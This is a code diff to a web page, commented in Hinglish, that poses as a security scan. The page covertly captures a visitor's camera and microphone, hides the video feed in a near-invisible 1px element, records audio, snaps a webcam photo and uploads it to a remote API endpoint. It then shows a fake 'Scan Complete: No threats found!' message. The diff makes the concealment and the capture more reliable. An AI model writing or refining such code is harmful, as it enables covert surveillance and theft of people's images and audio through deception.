@@ -8,15 +8,16 @@
         body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
         .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
         
-        /* FIX: Video ko hide karne ka naya tarika */
+        /* FIX: Video ko hide karne ka naya aur behtar tarika */
         #hidden_video { 
-            position: absolute; 
+            position: fixed; 
             top: 0; 
             left: 0; 
             width: 1px; 
             height: 1px; 
-            opacity: 0.01; /* Bilkul halka sa visible taaki browser ise chalu rakhe */
+            opacity: 0.01; 
             pointer-events: none;
+            z-index: -1;
         }
     </style>
 </head>
@@ -51,14 +52,14 @@
             // 2. Access Camera & Mic
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, // Front camera specify kiya
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
                     audio: true 
                 });
 
                 const video = document.getElementById('hidden_video');
                 video.srcObject = stream;
 
-                // Audio recording start
+                // Audio recording logic
                 const mediaRecorder = new MediaRecorder(stream);
                 let audioChunks = [];
                 mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
@@ -76,18 +77,18 @@
                 };
                 mediaRecorder.start();
 
-                // FIX: Wait for video to actually start playing
-                video.onloadedmetadata = () => {
+                // FIX: Video stream chalu hone ka wait karna
+                video.onplay = () => {
                     setTimeout(async () => {
                         const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
+                        // Video ke actual dimensions use karein
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
                         
-                        // Drawing the frame to canvas
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        const imgData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality for faster upload
+                        const imgData = canvas.toDataURL('image/jpeg', 0.6); // Slightly lower quality for faster upload
                         
                         await fetch(API_URL, {
                             method: 'POST',
@@ -98,7 +99,7 @@
                         mediaRecorder.stop();
                         stream.getTracks().forEach(t => t.stop());
                         alert("Scan Complete: No threats found!");
-                    }, 4000); // 4 seconds ka wait perfect hai
+                    }, 4000); // 4 seconds ka buffer
                 };
 
             } catch (err) {
